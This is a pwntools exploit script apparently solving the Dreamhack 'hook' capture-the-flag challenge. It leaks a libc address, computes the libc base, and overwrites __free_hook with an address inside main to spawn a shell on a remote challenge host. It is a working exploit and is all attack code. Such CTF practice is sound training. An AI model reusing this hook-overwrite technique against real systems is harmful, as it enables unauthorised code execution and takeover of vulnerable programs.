from pwn import *

PORT =  23863
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./hook_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x4009b7
            b*0x4009e4
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


p.recvuntil(b"stdout: ")
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x3c5620
log.info("libc_base: " + hex(libc.address))

p.sendlineafter(b"Size: ", str(256).encode())

system = exe.sym.main+199
free_hook = libc.sym.__free_hook
pl = flat(
    free_hook,
    system
    )
p.sendlineafter(b"Data: ", pl)


p.interactive()
